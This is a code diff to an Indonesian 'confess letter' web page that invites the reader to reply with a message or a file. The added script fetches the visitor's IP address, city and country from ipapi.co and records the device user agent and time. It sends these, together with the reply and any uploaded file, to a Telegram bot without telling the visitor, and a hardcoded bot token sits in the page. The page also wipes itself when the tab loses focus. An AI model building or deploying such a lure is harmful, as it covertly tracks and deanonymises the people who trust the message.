@@ -4,7 +4,11 @@
 <meta charset="UTF-8">
 <title>Confess Letter</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
+*{box-sizing:border-box}
 body{
   background:#0b0f1a;
   color:#fff;
@@ -15,50 +19,61 @@ body{
   height:100vh;
 }
 .box{
-  background:rgba(255,255,255,0.05);
+  max-width:420px;
   padding:30px;
-  border-radius:20px;
-  max-width:400px;
-  backdrop-filter:blur(15px);
+  border-radius:22px;
+  background:rgba(255,255,255,0.06);
+  backdrop-filter:blur(14px);
+  box-shadow:0 25px 60px rgba(0,0,0,.5);
+}
+p{
+  line-height:1.6;
+  opacity:.9;
 }
 textarea,input{
   width:100%;
-  margin-top:10px;
-  padding:10px;
-  border-radius:10px;
+  margin-top:12px;
+  padding:12px;
+  border-radius:12px;
   border:none;
+  outline:none;
 }
 button{
   width:100%;
   margin-top:15px;
   padding:12px;
   border:none;
-  border-radius:10px;
+  border-radius:12px;
   background:#ff6a88;
   color:#fff;
+  font-weight:600;
+  cursor:pointer;
 }
 #timer{
   margin-top:10px;
   font-size:12px;
   opacity:.7;
+  text-align:center;
 }
 </style>
 </head>
 <body>
 
 <div class="box" id="content">
-  <h2>💌 Untukmu</h2>
+  <h2>💌 Hai...</h2>
+
   <p>
-Hai... Terima kasih sudah baca pesan ini.  
+Terima kasih sudah baca pesan ini.  
 Sejujurnya aku tertarik denganmu.  
 Aku tidak berharap lebih, hanya berharap setelah ini kita tidak asing.  
 
-Kalau kamu mau balas, bisa kirim lewat kolom di bawah ini ya.
+Kalau kamu mau balas, kirim lewat kolom di bawah ini ya.
   </p>
 
-  <textarea id="msg" placeholder="Tulis balasan..."></textarea>
+  <textarea id="msg" placeholder="Tulis balasanmu..."></textarea>
   <input type="file" id="file">
-  <button onclick="sendReply()">Kirim</button>
+  <button onclick="sendReply()">Kirim Balasan</button>
+
   <div id="timer">⏳ Pesan akan hilang dalam 20 detik</div>
 </div>
 
@@ -66,26 +81,38 @@ Kalau kamu mau balas, bisa kirim lewat kolom di bawah ini ya.
 const BOT_TOKEN="8404649278:AAGXj2Dkywrbha_PYq26kx0fIAB44ZQiBRc";
 const CHAT_ID="8404649278";
 
+async function getInfo(){
+  const res = await fetch("https://ipapi.co/json/");
+  return await res.json();
+}
+
+/* AUTO DESTROY */
 let time=20;
-const countdown=setInterval(()=>{
+const cd=setInterval(()=>{
   time--;
-  document.getElementById("timer").innerText=`⏳ Pesan akan hilang dalam ${time} detik`;
+  document.getElementById("timer").innerText=
+    `⏳ Pesan akan hilang dalam ${time} detik`;
   if(time<=0) destroy();
 },1000);
 
 function destroy(){
-  document.body.innerHTML="<h2>💥 Pesan telah dihancurkan</h2>";
+  document.body.innerHTML=
+    "<h2 style='color:white'>💥 Pesan telah dihancurkan</h2>";
 }
 
+/* ANTI SCREENSHOT / TAB CHANGE */
 document.addEventListener("visibilitychange",()=>{
   if(document.hidden) destroy();
 });
-
 window.addEventListener("blur",destroy);
 
-function sendReply(){
+/* SEND REPLY */
+async function sendReply(){
   const text=document.getElementById("msg").value;
   const file=document.getElementById("file").files[0];
+  const info=await getInfo();
+  const device=navigator.userAgent;
+  const now=new Date().toLocaleString("id-ID");
 
   if(text){
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
@@ -93,7 +120,20 @@ function sendReply(){
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify({
         chat_id:CHAT_ID,
-        text:`💬 Balasan Confess:\n${text}`
+        parse_mode:"Markdown",
+        text:
+`💬 *Balasan Confess*
+
+🕒 ${now}
+
+📍 ${info.city}, ${info.country_name}
+🌐 IP: ${info.ip}
+
+📱 Device:
+${device}
+
+✉️ Pesan:
+${text}`
       })
     });
   }
@@ -102,6 +142,10 @@ function sendReply(){
     const fd=new FormData();
     fd.append("chat_id",CHAT_ID);
     fd.append("document",file);
+    fd.append("caption",
+`📎 File Balasan
+IP: ${info.ip}
+Device: ${device}`);
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,{
       method:"POST",
@@ -109,7 +153,7 @@ function sendReply(){
     });
   }
 
-  alert("Balasan terkirim 💌");
+  alert("💌 Balasan terkirim");
 }
 </script>
 
